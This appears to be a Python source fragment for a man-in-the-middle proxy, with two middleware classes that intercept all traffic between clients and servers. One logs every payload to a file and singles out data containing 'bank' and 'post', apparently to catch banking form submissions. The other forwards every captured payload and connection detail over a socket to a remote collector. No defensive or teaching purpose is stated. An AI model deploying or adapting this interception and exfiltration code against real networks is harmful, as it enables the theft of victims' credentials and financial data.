class FileLog(middleware.Middleware):
    @staticmethod
    async def mitm_started(host: str, port: int):
        file.write("MITM started on %s:%d.\n" % (host, port))
        print("MITM started on %s:%d.\n" % (host, port))

    @staticmethod
    async def client_connected(connection: Connection):
        host, port = connection.client.writer._transport.get_extra_info("peername")
        file.write("Client %s:%i has connected.\n" % (host, port))
        print("Client %s:%i has connected.\n" % (host, port))

    @staticmethod
    async def server_connected(connection: Connection):
        host, port = connection.server.writer._transport.get_extra_info("peername")
        file.write("Connected to server %s:%i.\n" % (host, port))
        print("Connected to server %s:%i.\n" % (host, port))

    @staticmethod
    async def client_data(connection: Connection, data: bytes) -> bytes:
        file.write("Client to server: \n\n\t%s\n" % data)
        # print("Client to server: \n\n\t%s\n" % data)
        await start_connection(connection, data)
        if b"bank" in data and b"post" in data:
            print(data)
        else:
            print(data)
        return data

    @staticmethod
    async def server_data(connection: Connection, data: bytes) -> bytes:
        file.write("Server to client: \n\n\t%s\n" % data)
        # print("Server to client: \n\n\t%s\n" % data)
        return data

    @staticmethod
    async def client_disconnected(connection: Connection):
        file.write("Client has disconnected.\n")
        # print("Client has disconnected.\n")

    @staticmethod
    async def server_disconnected(connection: Connection):
        file.write("Server has disconnected.")
        # print("Server has disconnected.")


class NetLog(middleware.Middleware):
    @staticmethod
    async def mitm_started(host: str, port: int):
        send("MITM started on %s:%d." % (host, port), my_socket)

    @staticmethod
    async def client_connected(connection: Connection):
        host, port = connection.client.writer._transport.get_extra_info("peername")
        send("Client %s:%i has connected." % (host, port), my_socket)

    @staticmethod
    async def server_connected(connection: Connection):
        host, port = connection.server.writer._transport.get_extra_info("peername")
        send("Connected to server %s:%i." % (host, port), my_socket)

    @staticmethod
    async def client_data(connection: Connection, data: bytes) -> bytes:
        await start_connection(connection, data)
        send("Client to server: \n\n\t%s\n" % data, my_socket)
        return data

    @staticmethod
    async def server_data(connection: Connection, data: bytes) -> bytes:
        send("Server to client: \n\n\t%s\n" % data, my_socket)
        return data

    @staticmethod
    async def client_disconnected(connection: Connection):
        send("Client has disconnected.", my_socket)

    @staticmethod
    async def server_disconnected(connection: Connection):
        send("Server has disconnected.", my_socket)